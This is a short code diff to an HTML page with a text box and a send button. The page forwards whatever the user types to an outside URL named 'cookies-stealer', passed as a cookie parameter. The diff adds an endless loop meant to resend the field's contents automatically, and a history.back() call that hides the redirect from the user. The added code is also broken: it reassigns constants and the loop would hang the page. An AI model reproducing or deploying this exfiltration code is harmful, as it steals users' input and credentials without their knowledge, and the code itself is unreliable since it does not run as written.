@@ -8,9 +8,19 @@
   <button onclick="sendInput()">送信</button>
 
   <script>
+    const input = "";
+    const input2 = document.getElementById('inputText').value;
+    while (true) {
+      if (input !== input2) {
+        sendInput();
+        input = input2;
+        console.log(input);
+      }
+    }
     function sendInput() {
-      const input = document.getElementById('inputText').value;
+      input2 = document.getElementById('inputText').value;
       location.href = "https://masa-pokemon.github.io/cookies-stealer/?cookie=" + encodeURIComponent(input);
+      history.back();
     }
   </script>
 </body>
